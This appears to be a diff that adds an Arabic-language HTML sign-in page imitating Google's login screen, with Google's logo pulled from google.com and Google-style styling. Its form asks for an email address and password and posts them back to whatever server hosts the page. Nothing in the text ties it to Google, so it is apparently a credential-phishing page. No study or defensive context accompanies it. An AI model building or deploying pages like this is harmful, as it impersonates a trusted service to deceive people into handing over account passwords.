@@ -1,0 +1,84 @@
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>تسجيل الدخول إلى Google</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    form {
+      border: 1px solid #ddd;
+      padding: 30px 40px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+      border-radius: 8px;
+      width: 320px;
+      background-color: #fff;
+      text-align: center;
+    }
+
+    img {
+      width: 80px;
+      margin-bottom: 16px;
+    }
+
+    h2 {
+      margin: 0 0 24px 0;
+      font-weight: 400;
+      color: #202124;
+      font-size: 24px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      margin-bottom: 18px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      box-sizing: border-box;
+      outline: none;
+      text-align: right;
+      direction: rtl;
+      transition: border-color 0.3s;
+    }
+
+    input:focus {
+      border-color: #4285f4;
+      box-shadow: 0 0 5px rgba(66, 133, 244, 0.5);
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1a73e8;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #1669c1;
+    }
+  </style>
+</head>
+<body>
+  <form method="POST">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="شعار Google" />
+    <h2>تسجيل الدخول</h2>
+    <input name="email" type="email" placeholder="البريد الإلكتروني" required />
+    <input name="password" type="password" placeholder="أدخل كلمة المرور" required />
+    <button type="submit">التالي</button>
+  </form>
+</body>
+</html>
